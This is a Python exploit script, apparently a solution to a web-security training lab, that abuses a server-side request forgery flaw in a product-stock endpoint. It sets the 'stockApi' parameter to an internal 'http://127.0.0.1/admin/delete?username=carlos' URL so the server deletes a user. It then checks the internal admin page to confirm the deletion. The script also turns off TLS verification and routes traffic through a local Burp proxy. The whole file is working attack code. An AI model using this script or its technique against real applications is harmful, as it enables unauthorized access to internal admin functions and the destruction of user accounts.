import requests
import urllib3
from sys import argv
				
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

					# set this proxy for burp
proxies = {"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}


def get_website_url():
	if len(argv) != 2:
		print(f"[+] usage {argv[0]} <url>")
		print(f"[+] example {argv[0]} http://example.com")
		exit(-1)
	if argv[1][-1] == '/':
		url = argv[1][:-1]
	else:
		url = argv[1]
	return url

def delete_user(url):
	stock_path = "/product/stock"
	admin_ssrf_path = "http://127.0.0.1/admin"
	delete_user_ssrf_path = "http://127.0.0.1/admin/delete?username=carlos"

	params = {
		"stockApi":delete_user_ssrf_path
	}
	r = requests.post(url + stock_path, data=params, verify=False, proxies=proxies)

	# check if user deleted or not
	params={
		"stockApi":admin_ssrf_path
	}
	r2 = requests.post(url + stock_path, data=params, verify=False, proxies=proxies)
	if 'carlos' in r2.text:
		print("[-] Attack un successfully")
	else:
		print(r2.text)
		print("[+] User Delted successfully")


print("[+] Starting attack")
delete_user(get_website_url())